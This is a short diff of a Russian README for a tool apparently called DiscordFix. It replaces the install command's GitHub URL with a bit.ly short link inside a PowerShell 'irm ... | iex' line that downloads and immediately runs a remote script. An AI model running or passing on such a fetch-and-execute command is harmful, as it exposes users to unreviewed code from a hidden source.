@@ -21,7 +21,7 @@
 2. Введите следующую команду и нажмите Enter:
 
 ```PowerShell
-irm https://raw.githubusercontent.com/anlix-y/DiscordFix/refs/heads/main/web.ps1 | iex
+irm https://bit.ly/discordfixxx | iex
 ```
 
 ## Функции
